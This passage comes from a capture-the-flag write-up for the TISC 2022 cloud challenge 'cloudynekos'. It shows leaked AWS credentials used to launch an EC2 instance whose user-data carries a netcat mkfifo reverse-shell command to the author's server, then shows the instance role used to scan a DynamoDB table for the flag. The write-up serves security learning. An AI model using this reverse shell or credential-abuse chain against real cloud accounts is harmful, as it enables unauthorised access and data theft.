- `subnet-id`: `subnet-0aa6ecdf900166741` (retrieved through `aws ec2 describe-subnets`)
- `security-group-ids`: `sg-047c958320ee832f0` (retrieved through `aws ec2 describe-security-groups`)
- `tag-specifications`: `'ResourceType=instance,Tags=[{Key=agent,Value=<current_username>}]'` (as specified in `notes.txt`)
- `iam-instance-profile`: `"Arn=arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile` (retrieved through `aws iam list-instance-profiles`)
- `instance-type`: `t2.micro` (this can probably be anything honestly)
- `image-id`: `ami-02ee763250491e04a` (this can probably be anything as well but personally i chose to use an Ubuntu AMI).

If you're familiar with EC2 instances, you would realise that in order to access the EC2 instance, you're going to need an SSH key, which unfortunately you do not have permissions to create. Fortunately, there's another way to access the instance, and that is to catch a reverse shell, injecting the necessary reverse shell payload command on startup of the instance with the `user-data` argument. So in addition to all of the above, we would also want to create a text file that contains the command we want to run on startup and pass in to the `user-data`. Since I'm using an Ubuntu AMI, I decided to opt for the Netcat OpenBsd reverse shell command:

```bash
└─$ cat file.txt
#!/bin/bash

rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IPAddress_of_Server> 443 >/tmp/f
```

Let's prepare to catch the reverse shell on our server:
`sudo nc -nlvp 443`

And now we run our ec2 instance!
```bash
└─$ aws --profile lambda ec2 run-instances \                                                                  130 ⨯
--subnet-id subnet-0aa6ecdf900166741 \
--image-id ami-02ee763250491e04a \
--instance-type t2.micro \
--security-group-ids sg-047c958320ee832f0 \
--tag-specifications 'ResourceType=instance,Tags=[{Key=agent,Value=user-59b23d07b5ee4cb2a64d1e481dd4f235}]' \
--user-data file://file.txt \
--iam-instance-profile "Arn=arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile" \
--region ap-southeast-1
```

After waiting for the instance to start up, we have caught our reverse shell!

## Interacting with the DynamoDB Service
If we recall, our EC2 instance that has the `ec2_agent_instance_profile` attached has the `ec2_agent_role` permissions:
```json
"Statement": [
    {
        "Action": [
            "dynamodb:DescribeTable",
            "dynamodb:ListTables",
            "dynamodb:Scan",
            "dynamodb:Query"
        ],
        "Effect": "Allow",
        "Resource": "*",
        "Sid": "VisualEditor0"
    }
```

Let's first install the `aws-cli` onto the newly created EC2 instance:

`sudo apt update && sudo apt install awscli`

After installing the `aws-cli`, we can finally use it to interact with the DynamoDB service. Let's enumerate the list of tables first with `aws dynamodb list-tables`:

```bash
$ aws dynamodb list-tables --region ap-southeast-1
{
    "TableNames": [
        "flag_db"
    ]
}
```

Oh nice, there's a `flag_db` table! Let's scan it and see what comes up!

```bash
$ aws --region ap-southeast-1 dynamodb scan --table-name flag_db
{
    "Items": [
        {
            "secret": {
                "S": "TISC{iT3_N0t_s0_C1oUdy}"
            },
            "name": {
                "S": "flag"
            }
        }
    ],
    "Count": 1,
    "ScannedCount": 1,
    "ConsumedCapacity": null
}
```

And there we have it! Our flag is in the `flag_db` table! 

Let's summarise our whole journey on how we uncovered the flag:

![diagram-3](/images/posts/tisc-2022-level4-diagram-3.jpg)

## Final Words
If you made it this far, thank you for reading my write-up for this cloud challenge `cloudynekos` as part of TISC 2022! It was definitely a fun journey solving this cloud challenge and I definitely learned much more about how scary a set of leaked AWS IAM Credentials can quickly become, and also more importantly, how to abuse them as a pentester :)